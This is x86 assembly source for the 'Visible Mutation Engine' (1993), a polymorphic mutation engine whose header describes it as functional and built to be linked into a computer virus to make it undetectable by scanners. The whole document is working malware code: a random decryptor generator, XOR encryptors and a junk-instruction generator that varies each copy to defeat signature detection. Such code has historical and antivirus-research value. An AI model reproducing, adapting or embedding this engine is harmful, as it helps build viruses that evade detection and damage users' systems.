;The Visible Mutation Engine
;(C) 1993 American Eagle Publications, Inc. ALL RIGHTS RESERVED.

;WARNING: This is an actual, functional mutation engine. It can be attached to
;a virus and make it totally undetectable by scanners using current technology
;(March, 1993). It is intended for research and educational purposes only!

;The engine is an object module which can be linked into a virus, or any other
;software that needs to be self-encrypting.
;
;On calling the ENCRYPT routine,
;DS:SI points to where the code to encrypt is
;ES:DI points to where the decryption routine + encrypted code should be placed
;DX<>0 is the fixed size of the decryption routine.
;CX is the size of the unencrypted code
;BX is the starting offset of the decryption routine
;
;On return, carry will be set if there was an error which prevented the engine
;from generating the code. If successful, carry will be cleared.
;CX will be returned with the decryption routine + code size

                .model  tiny

                .code

                public  ENCRYPT

                extrn   RANDOM_SEED:near
                extrn   GET_RANDOM:near

CODE_LOC        DD      0                       ;area to save all passed parameters
ENCR_LOC        DD      0
DECR_SIZE       DW      0
DECR_OFFS       DW      0
CODE_SIZE       DW      0

ENCRYPT:
                cld
                push    bp                              ;preserve bp
                call    GET_LOC                         ;first figure out where we are
GET_LOC:        pop     bp
                sub     bp,OFFSET GET_LOC               ;offset stored in bp always
                push    ds
                mov     cs:[bp][DECR_OFFS],bx           ;save all calling parameters
                mov     bx,bp                           ;put base in bx
                mov     WORD PTR CS:[bx][CODE_LOC],si
                mov     WORD PTR CS:[bx][CODE_LOC+2],ds
                push    cs
                pop     ds
                mov     WORD PTR [bx][ENCR_LOC],di
                mov     WORD PTR [bx][ENCR_LOC+2],es
                mov     [bx][CODE_SIZE],cx
                mov     [bx][DECR_SIZE],dx
                call    RANDOM_SEED             ;seed random number generator
                call    SELECT_BASE             ;select decryptor base to use
                jc      ERR_EXIT                ;exit if error
                call    INIT_BASE               ;initialize decryptor
                jc      ERR_EXIT
                call    GENERATE_DECRYPT        ;create a decrypt routine in wkspace
                jc      ERR_EXIT
                call    ENCRYPT_CODE            ;encrypt the code as desired
                jc      ERR_EXIT                ;exit on error
                les     di,[bx][ENCR_LOC]       ;else set exit parameters
                mov     cx,[bx][CODE_SIZE]
                add     cx,[bx][DECR_SIZE]      ;cx=code+decr rtn size
ERR_EXIT:       pop     ds
                pop     bp
                ret

;******************************************************************************
;This routine selects which decryptor base to use. It simply gives each
;decryptor an even chance of being used. BASE_COUNT holds the total number
;of decryptor bases available to use, and BASE_NO is set by this function
;to the one that will be used from here on out. This routine also sets the
;size of the decryptor, if a fixed size is not specified. If a fixed size
;is specified, it checks to make sure enough room has been alotted. If not,
;it returns with carry set to indicate an error.
SELECT_BASE:
                call    GET_RANDOM              ;get a random number
                xor     dx,dx                   ;make it a dword
                mov     cx,[bx][BASE_COUNT]     ;get total number of base routines
                div     cx
                mov     [bx][BASE_NO],dx        ;save choice in BASE_NO
                mov     ax,[bx][DECR_SIZE]      ;ok, get requested size
                mov     si,dx                   ;get base number
                shl     si,1                    ;make an address out of it
                add     si,OFFSET BASE_SIZE_TBL
                mov     cx,[bx][si]             ;get selected base size
                or      ax,ax                   ;is decryptor size 0?
                jz      SEL_SIZE1               ;yes, select a random size
                cmp     ax,cx                   ;is ax>=cx?
                retn                            ;return with carry set right

;If no base size selected, pick a random size between the minimum required
;size and the minimum + 127.
SEL_SIZE1:      call    GET_RANDOM
                and     ax,007FH
                add     ax,cx
                cmp     ax,0080H
                jnc     SEL_SIZE1
                mov     [bx][DECR_SIZE],ax
                clc
                retn

;******************************************************************************
;This routine initializes the base routines for this round of encryption. It
;is responsible for inserting any starting/ending addresses into the base,
;and any random numbers that the base uses for encryption and decryption.
;It must insure that the encryptor and decryptor are set up the same way,
;so that they will work properly together. INIT_BASE itself is just a lookup
;function that jumps to the proper routine to work with the current base,
;as selected by SELECT_BASE. The functions in the lookup table perform all of
;the routine-specific chores.
INIT_BASE:
                mov     si,[bx][BASE_NO]
                shl     si,1                    ;determine encryptor to use
                add     si,OFFSET INIT_TABLE
                add     [bx][si],bx
                jmp     [bx][si]

INIT_TABLE      DW      OFFSET INIT_BASE0
                DW      OFFSET INIT_BASE1

;Initialize decryptor base number 0.
INIT_BASE0:
                sub     [bx][si],bx             ;make sure to clean up INIT_TABLE!
                mov     si,OFFSET _D0START      ;set start address
                mov     ax,[bx][DECR_OFFS]
                add     ax,[bx][DECR_SIZE]
                mov     [bx][si],ax
                mov     si,OFFSET _D0SIZE       ;set size to decrypt
                mov     ax,[bx][CODE_SIZE]
                mov     [bx][si],ax
IB0TRYA:        call    GET_RANDOM
                or      ah,ah                   ;avoid triviality!!
                jz      IB0TRYA
                mov     si,D0RAND1              ;set up first random byte (encr)
                mov     [bx][si],al
                mov     si,OFFSET _D0RAND1      ;set up first random byte (decr)
                mov     [bx][si],al
                mov     si,D0RAND2              ;set up second random byte
                mov     [bx][si],ah
                mov     si,OFFSET _D0RAND2      ;set up second random byte
                mov     [bx][si],ah
                clc
                retn                            ;that's it folks!

;Initialize decryptor base number 1. This only has to set up the decryptor
;because the encryptor calls the decryptor.
INIT_BASE1:
                sub     [bx][si],bx             ;make sure to clean up INIT_TABLE!
                mov     ax,[bx][DECR_OFFS]
                add     ax,[bx][DECR_SIZE]
                mov     si,D1START1             ;set start address 1
                mov     [bx][si],ax
                mov     si,D1START2             ;set start address 2
                mov     [bx][si],ax
                mov     si,D1SIZE               ;set size to decrypt
                mov     ax,[bx][CODE_SIZE]
                shr     ax,1                    ;use size / 2
                mov     [bx][si],ax
IB1TRYA:        call    GET_RANDOM
                or      ah,ah                   ;avoid triviality!!
                jz      IB1TRYA                 ;both bytes must be non-zero
                or      al,al
                jz      IB1TRYA
                mov     si,D1RAND               ;set up random word
                mov     [bx][si],ax
                clc
                retn                            ;that's it folks!


;******************************************************************************
;This routine encrypts the code using the desired encryption routine.
;On entry, es:di must point to where the encrypted code will go.
ENCRYPT_CODE:
                mov     si,[bx][BASE_NO]
                shl     si,1                    ;determine encryptor to use
                add     si,OFFSET ENCR_TABLE
                add     [bx][si],bx
                jmp     [bx][si]

ENCR_TABLE      DW      OFFSET ENCRYPT_CODE0
                DW      OFFSET ENCRYPT_CODE1

;Encryptor to go with decryptor base 0
ENCRYPT_CODE0:
                sub     [bx][si],bx             ;make sure to clean up ENCR_TABLE!
                push    ds                      ;may use a different ds below
                mov     cx,[bx][CODE_SIZE]
                lds     si,[bx][CODE_LOC]       ;ok, es:di and ds:si set up
                push    cx
                push    di
                rep     movsb                   ;move the code to work segment
                pop     si
                pop     cx
                push    es
                pop     ds
                call    ENCRYPT0                ;call encryptor
                pop     ds
                mov     bx,bp                   ;restore bx to code base
                clc                             ;return c reset for success
                retn

;Encryptor to go with decryptor base 1
ENCRYPT_CODE1:
                sub     [bx][si],bx             ;make sure to clean up ENCR_TABLE!
                push    ds                      ;may use a different ds below
                mov     cx,[bx][CODE_SIZE]
                lds     si,[bx][CODE_LOC]       ;ok, es:di and ds:si set up
                push    cx
                push    di
                rep     movsb                   ;move the code to work segment
                pop     di
                mov     si,di
                pop     dx
                push    es
                pop     ds
                call    ENCRYPT1                ;call encryptor
                pop     ds
                clc                             ;return c reset for success
                retn


;******************************************************************************
;The following routine generates a decrypt routine, and places it in memory
;at [ENCR_LOC]. This returns with es:di pointing to where encrypted code
;should go. It is assumed to have been setup properly by INIT_BASE. As with
;INIT_BASE, this routine performs a jump to the proper routine selected by
;BASE_NO, which then does all of the detailed work.
GENERATE_DECRYPT:
                mov     si,[bx][BASE_NO]
                shl     si,1                    ;determine encryptor to use
                add     si,OFFSET DECR_TABLE
                add     [bx][si],bx
                jmp     [bx][si]

DECR_TABLE      DW      OFFSET GEN_DECRYPT0
                DW      OFFSET GEN_DECRYPT1

GD0R1           DB      0
GD0R2           DB      0

;Generate the base routine 0.
GEN_DECRYPT0:
                sub     [bx][si],bx             ;make sure to clean up DECR_TABLE!
                mov     cx,OFFSET D0RET - OFFSET DECRYPT0
                mov     ax,[bx][DECR_SIZE]
                sub     ax,cx                   ;ax= # bytes free
                mov     [bx][RAND_CODE_BYTES],ax;save it here

                les     di,[bx][ENCR_LOC]       ;es:di points to where to put it

                mov     al,11001000B            ;select si, di or bx for r1
                call    GET_REGISTER            ;randomly
                mov     [bx][GD0R1],al
                mov     ah,0FFH                 ;mask to exclude bx
                cmp     al,3                    ;is al=bx?
                jnz     GD1
                mov     ah,01110111B            ;exclude bh, bl
GD1:            mov     al,11011101B            ;exclude ch, cl
                and     al,ah
                call    GET_REGISTER            ;select r2 randomly
                mov     [bx][GD0R2],al

                mov     ax,000000000B
                mov     cx,7
                call    RAND_CODE

                mov     al,[bx][GD0R1]          ;get r1
                or      al,0B8H                 ;mov r1,I
                stosb
_D0START        EQU     $+1
                mov     ax,0
                stosw

                mov     al,[bx][GD0R1]
                call    GEN_MASK
                or      al,00000010B
                push    ax
                xor     ah,ah
                mov     cx,6
                call    RAND_CODE

                mov     al,0B9H                 ;mov cx,0
                stosb
_D0SIZE         EQU     $+1
                mov     ax,0
                stosw

                mov     al,[bx][GD0R2]          ;build mask for r2
                call    GEN_MASK_BYTE
                pop     cx
                or      al,cl
                or      al,00000010B
                xor     ah,ah
                push    ax                      ;save mask
                mov     cx,5
                call    RAND_CODE

_D0RAND1        EQU     $+1
                mov     ah,0                    ;mov r2,0
                mov     al,[bx][GD0R2]
                or      al,0B0H
                stosw

                pop     ax
                push    ax                      ;get mask
                mov     cx,4
                call    RAND_CODE

                pop     ax
                push    di                      ;save address of xor for loop
                push    ax

                mov     al,[bx][GD0R1]          ;r1
                call    GET_DR                  ;change to ModR/M value
                mov     ah,[bx][GD0R2]
                mov     cl,3
                shl     ah,cl
                or      ah,al                   ;ah = r2*8 + r1
                push    ax

                cmp     [bx][RAND_CODE_BYTES],4 ;make sure room for largest rtn
                pop     ax
                jc      GD2                     ;if not, use smallest
                push    ax
                call    GET_RANDOM              ;select between xor and mov/xor/mov
                and     al,80H
                pop     ax
                jz      GD2                     ;select xor

                xor     ah,00100000B            ;switch between ah & al, etc.
                mov     al,8AH
                stosw                           ;mov r2',[r1]
                pop     dx                      ;get mask for RAND_CODE
                push    dx
                push    ax

                push    dx
                mov     ax,dx
                mov     cx,8
                call    RAND_CODE

                mov     al,[bx][GD0R2]          ;get r2
                mov     cl,3
                shl     al,cl
                or      al,[bx][GD0R2]          ;r2 in both src & dest
                xor     al,11000100B            ;now have r2',r2
                mov     ah,30H
                xchg    al,ah
                stosw                           ;xor r2',r2

                pop     ax
                mov     cx,8
                call    RAND_CODE

                pop     ax
                mov     al,88H
                stosw                           ;mov [r1],r2'
                sub     [bx][RAND_CODE_BYTES],4 ;must adjust this!
                jmp     SHORT GD3

GD2:            mov     al,30H                  ;xor [r1],r2
                stosw

GD3:            pop     ax                      ;get register flags
                push    ax
                mov     cx,3
                call    RAND_CODE

                mov     al,[bx][GD0R1]          ;inc r1
                or      al,40H
                stosb

                pop     ax                      ;get mask
                push    ax
                mov     cx,2
                call    RAND_CODE

                mov     al,80H                  ;add r2,0
                mov     ah,[bx][GD0R2]
                or      ah,0C0H
                stosw
_D0RAND2        EQU     $+1
                mov     al,0
                stosb

                pop     ax                      ;get retister flags
                mov     cx,1
                call    RAND_CODE

                pop     cx                      ;address to jump to
                dec     cx
                dec     cx
                sub     cx,di
                mov     ah,cl
                mov     al,0E2H                 ;loop D0LP
                stosw

                mov     ax,000000000H           ;fill remaining space with random code
                xor     cx,cx
                call    RAND_CODE

                clc                             ;return with c reset
                retn


;Generate the base routine 1.
GEN_DECRYPT1:
                sub     [bx][si],bx             ;make sure to clean up DECR_TABLE!
                mov     cx,OFFSET D1RET
                sub     cx,OFFSET DECRYPT1      ;cx=# of bytes in decryptor
                push    cx
                mov     si,OFFSET DECRYPT1      ;[bx][si] points to DECRYPT1
                add     si,bx                   ;si points to DECRYPT1
                les     di,[bx][ENCR_LOC]       ;es:di points to where to put it
                rep     movsb                   ;simply move it for now
                pop     ax
                mov     cx,[bx][DECR_SIZE]      ;get decryptor size
                sub     cx,ax                   ;need this many more bytes
                mov     al,90H                  ;NOP code in al
                rep     stosb                   ;put NOP's in
                clc                             ;return with c reset
                retn


;******************************************************************************
;Bases for Decrypt/Encrypt routines.

BASE_COUNT      DW      2               ;number of base routines available
BASE_NO         DW      0               ;base number in use
BASE_SIZE_TBL   DW      OFFSET D0RET - OFFSET DECRYPT0
                DW      OFFSET D1RET - OFFSET DECRYPT1

;This is the actual base routine 0. This is just a single-reference, varying
;byte-wise XOR routine.
DECRYPT0:
                mov     si,0                    ;mov si,OFFSET ENCRYPTED
                mov     cx,0                    ;mov cx,ENCRYPTED SIZE
ENCRYPT0:       mov     bl,0                    ;mov bl,RANDOM BYTE 1
D0LP:           xor     [si],bl
                inc     si
                add     bl,0                    ;add bl,RANDOM BYTE 2
                loop    D0LP
D0RET:          retn                            ;not used by decryptor!

;Defines to go with base routine 0
D0RAND1         EQU     OFFSET DECRYPT0 + 7
D0RAND2         EQU     OFFSET DECRYPT0 + 13

;Here is the base routine 1. This is a double-reference, word-wise, fixed XOR
;encryptor.
DECRYPT1:
                mov     si,0
                mov     di,0
                mov     dx,0
ENCRYPT1:
D1LP:           mov     ax,[si]
                add     si,2
                xor     ax,0
                mov     ds:[di],ax
                add     di,2
                dec     dx
                jnz     D1LP
D1RET:          ret

;Defines to go with base routine 1
D1START1        EQU     OFFSET DECRYPT1 + 1
D1START2        EQU     OFFSET DECRYPT1 + 4
D1SIZE          EQU     OFFSET DECRYPT1 + 7
D1RAND          EQU     OFFSET DECRYPT1 + 15


;Random code generator. Bits set in al register tell which registers should
;NOT be changed by the routine, as follows: (Segment registers aren't changed)
;
;  Bit 0 = ax
;  Bit 1 = cx
;  Bit 2 = dx
;  Bit 3 = bx
;  Bit 4 = sp
;  Bit 5 = bp
;  Bit 6 = si
;  Bit 7 = di
;  Bit 8 = flags
;
;The cx register indicates how many more calls to RAND_CODE are expected
;in this execution. It is used to distribute the remaining bytes equally.
;For example, if you had 100 bytes left, but 10 calls to RAND_CODE, you
;want about 10 bytes each time. If you have only 2 calls, though, you
;want about 50 bytes each time. If CX=0, RAND_CODE will use up all remaining
;bytes.

RAND_CODE_BYTES DW      0               ;max number of bytes to use up

RAND_CODE:
                or      cx,cx                           ;last call?
                jnz     RCODE1                          ;no, determine bytes
                mov     cx,[bx][RAND_CODE_BYTES]        ;yes, use all available
                or      cx,cx                           ;is it zero?
                push    ax                              ;save modify flags
                jz      RCODE3                          ;zero, just exit
                jmp     short RCODE2                    ;else go use them
RCODE1:         push    ax                              ;save modify flags
                mov     ax,[bx][RAND_CODE_BYTES]
                or      ax,ax
                jz      RCODE3
                shl     ax,1                            ;ax=2*bytes available
                xor     dx,dx
                div     cx                              ;ax=mod for random call
                or      ax,ax
                jz      RCODE3
                mov     cx,ax                           ;get random betw 0 & cx
                call    GET_RANDOM                      ;random # in ax
                xor     dx,dx                           ;after div,
                div     cx                              ;dx=random number desired
                mov     cx,dx
                cmp     cx,[bx][RAND_CODE_BYTES]
                jc      RCODE2                          ;make sure not too big
                mov     cx,[bx][RAND_CODE_BYTES]        ;if too big, just use all
RCODE2:         or      cx,cx
                jz      RCODE3
                sub     [bx][RAND_CODE_BYTES],cx        ;subtract off bytes used
                pop     ax                              ;modify flags

RC_LOOP:        push    ax
                call    RAND_INSTR                      ;generate a single instruction
                pop     ax
                or      cx,cx
                jnz     RC_LOOP

                ret

RCODE3:         pop     ax
                ret

;This routine generates a random instruction and puts it at es:di, decrementing
;cx by the number of bytes the instruction took, and incrementing di as well.
;It uses ax to determine which registers may be modified by the instruction.
;For the contents of ax, see the comments before RAND_CODE.
RAND_INSTR:
                or      ax,00010000B            ;never allow stack to be altered
                push    ax
                cmp     al,0FFH                 ;are any register mods allowed?
                je      RI1                     ;nope, go set max subrtn number
                mov     dx,3
                neg     al                      ;see if 2 or more registers ok
RI0:            shr     al,1
                jnc     RI0                     ;shift out 1st register
                or      al,al                   ;if al=0, only 1 register ok
                jnz     RI2                     ;non-zero, 2 register instrs ok
                dec     dx
                jmp     SHORT RI2
RI1:            mov     dx,0                    ;dx contains max subrtn number
                cmp     ah,1                    ;how about flags?
                je      RI2                     ;nope, only 0 allowed
                inc     dx                      ;flags ok, 0 and 1 allowed

RI2:            call    GET_RANDOM              ;get random number betw 0 & dx
                mov     al,ah
                xor     ah,ah
                inc     dx                      ;dx=modifier
                push    cx
                mov     cx,dx
                xor     dx,dx
                div     cx                      ;now dx=random number desired
                pop     cx
                pop     ax
                mov     si,dx
                shl     si,1                    ;determine routine to use
                add     si,OFFSET RI_TABLE
                add     [bx][si],bx
                jmp     [bx][si]

RI_TABLE        DW      OFFSET RAND_INSTR0
                DW      OFFSET RAND_INSTR1
                DW      OFFSET RAND_INSTR2
                DW      OFFSET RAND_INSTR3

;If this routine is called, no registers must be modified, and the flags must
;not be modified by any instructions generated. 9 possibilities here.
RAND_INSTR0:
                sub     [bx][si],bx             ;make sure to clean up!
                push    ax
                push    cx
                cmp     cx,2                    ;do we have 2 bytes to work with?
                jc      RI01                    ;no--must do a nop
                call    GET_RANDOM              ;yes--do either a nop or a push/pop
                xchg    al,ah
                mov     cx,9                    ;even chance of 8 push/pops & nop
                xor     dx,dx
                div     cx
                or      dx,dx                   ;if dx=0
                jz      RI01                    ;go do a nop, else push/pop
                mov     al,11111111B
                call    GET_REGISTER            ;get any register
                pop     cx                      ;get bytes avail off stack
                add     al,50H                  ;push r = 50H + r
                stosb
                pop     dx                      ;get register flags off stack
                push    ax                      ;save "push r"
                sub     cx,2                    ;decrement bytes avail now
                cmp     cx,1                    ;see if more than 2 bytes avail
                jc      RI02A                   ;nope, go do the pop
                push    cx                      ;keep cx!
                call    GEN_MASK                ;legal to modify the
                pop     cx                      ;register we pushed
                xor     al,0FFH                 ;so work it into the mask
                and     dl,al                   ;for more variability
                mov     ax,dx                   ;new register flags to ax
                call    RAND_INSTR              ;recursively call RAND_INSTR
RI02A:          pop     ax
                add     al,8                    ;pop r = 58H + r
                stosb
                ret

RI01:           mov     al,90H
                stosb
                pop     cx
                pop     ax
                dec     cx
                ret

;If this routine is called, no registers are modified, but the flags are.
;Right now it just implements some simple flags-only instructions
;35 total possibilities here
RAND_INSTR1:
                sub     [bx][si],bx             ;make sure to clean up!
                push    cx
RAND_INSTR1A:   cmp     cx,2                    ;do we have 2 bytes available?
                jc      RI11                    ;no, go handle 1 byte instr's
                cmp     cx,4                    ;do we have 4 bytes?
                jc      RI12

RI14:           call    GET_RANDOM              ;4 byte solutions (16 possible)
                and     al,80H
                jnz     RI12                    ;50-50 chance of staying here
                mov     al,11111111B
                call    GET_REGISTER            ;get any register
                mov     ah,al                   ;set up register byte for AND/OR
                xor     al,al
                mov     cx,ax
                call    GET_RANDOM
                and     al,80H
                jnz     RI14A                   ;select "and" or "or"
                or      cx,0C881H               ;OR R,0
                mov     ax,cx
                xor     cx,cx
                jmp     SHORT RI14B
RI14A:          or      cx,0E081H               ;AND R,FFFF
                mov     ax,cx
                mov     cx,0FFFFH
RI14B:          stosw
                mov     ax,cx
                stosw
                pop     cx
                sub     cx,4
                ret

RI12:           call    GET_RANDOM              ;2 byte solutions (16 possible)
                and     al,0C0H                 ;75% chance of staying here
                cmp     al,0C0H
                je      RI11                    ;25% of taking 1 byte solution
                mov     al,11111111B
                call    GET_REGISTER            ;get any register
                mov     ah,al                   ;set up register byte for AND/OR
                mov     cl,3
                shl     ah,cl
                or      ah,al
                or      ah,0C0H
                mov     ch,ah
                call    GET_RANDOM
                and     al,80H
                jz      RI12A                   ;select "and" or "or"
                mov     al,9                    ;OR R,R
                jmp     SHORT RI12B
RI12A:          mov     al,21H                  ;AND R,R
RI12B:          mov     ah,ch
                stosw
                pop     cx
                sub     cx,2
                ret

RI11:           call    GET_RANDOM
                and     ah,3                    ;take one of 3 possibilities
                mov     al,0F8H                 ;clc instruction
                or      ah,ah
                jz      RI11A
                mov     al,0F9H                 ;stc instruction
                dec     ah
                jz      RI11A
                mov     al,0F5H                 ;cmc instruction
                dec     ah
                jz      RI11A

RI11A:          stosb
                pop     cx
                dec     cx
                ret

;If this routine is called, one register is modified, as specified in al. It
;assumes that flags may be modified.
RAND_INSTR2:
                sub     [bx][si],bx                     ;make sure to clean up!
                push    cx
                push    cx
                mov     dx,ax
                xor     al,0FFH                         ;set legal, allowed regs
                call    GET_REGISTER                    ;get a random, legal register
                pop     cx
                push    ax                              ;save it
                cmp     cx,2
                jc      RI21                            ;only 1 byte available
                cmp     cx,3
                jc      RI22                            ;only 2 bytes avaiable

RI23:                                   ;3 bytes, modify one register
                call    GET_RANDOM                      ;get random number
                and     al,80H                          ;decide 3 byte or 2
                jnz     RI22
                call    GET_RANDOM                      ;X to use in generator
                mov     cx,ax
                pop     ax                              ;get register
                or      al,0B8H                         ;mov R,X
                stosb
                mov     ax,cx
                stosw
                pop     cx
                sub     cx,3
                ret

RI22:                                   ;2 bytes, modify one register
                call    GET_RANDOM
                and     al,80H          ;decide 2 byte or 1
                jnz     RI21            ;do one byte
                mov     al,11111111B
                call    GET_REGISTER    ;get a random register
                mov     cl,3
                shl     al,cl
                pop     cx
                or      al,cl           ;put both registers in place
                or      al,0C0H
                mov     ah,al
                mov     al,89H          ;mov r2,r1
                stosw
                pop     cx
                sub     cx,2
                ret

RI21:                                   ;one byte, modify one register
                and     dh,1                            ;can we modify flags?
                pop     ax
                jnz     RI20                            ;no, exit this one
                push    ax
                call    GET_RANDOM                      ;do inc/dec only
                mov     ah,40H                          ;assume INC R (40H+R)
                and     al,80H                          ;decide which
                jz      RI21A
                or      ah,8                            ;do DEC R (48H+R)
RI21A:          pop     cx
                or      ah,cl                           ;put register in
                mov     al,ah
                stosb
                pop     cx
                dec     cx
                ret

RI20:           pop     cx
                jmp     RAND_INSTR1A


;If this routine is called, up to two registers are modified, as specified in
;al.
RAND_INSTR3:    ;NOT IMPLEMENTED
                jmp     RAND_INSTR2


;This routine gets a random register using the mask al (as above).
;In this mask, a 1 indicates an acceptable register. On return, the random
;register number is in al.
GET_REGISTER:
                mov     ch,al
GREG1:          call    GET_RANDOM              ;get a random number
                and     ah,7                    ;al=0 to 7 now
                mov     cl,ah
                mov     al,1
                shl     al,cl                   ;set a bit in al
                and     al,ch                   ;did we get a legal register?
                jz      GREG1                   ;nope, try again
                mov     al,cl                   ;yes, put it in al
                ret

;This converts a register number in al into a displacement ModR/M value and
;puts it back in al. Basically, 7-->5, 6-->4, 5-->6, 3-->7.
GET_DR:
                cmp     al,6
                jnc     GDR1
                add     al,3
                cmp     al,8
                je      GDR1
                mov     al,9
GDR1:           sub     al,2
                ret

;Create a bit mask from word register al
GEN_MASK:
                mov     cl,al
                mov     al,1
                shl     al,cl
                ret

;Create a word bit mask from byte register al
GEN_MASK_BYTE:
                mov     cl,al
                mov     al,1
                shl     al,cl
                mov     ah,al
                mov     cl,4
                shr     ah,cl
                or      al,ah
                and     al,0FH
                ret

                END

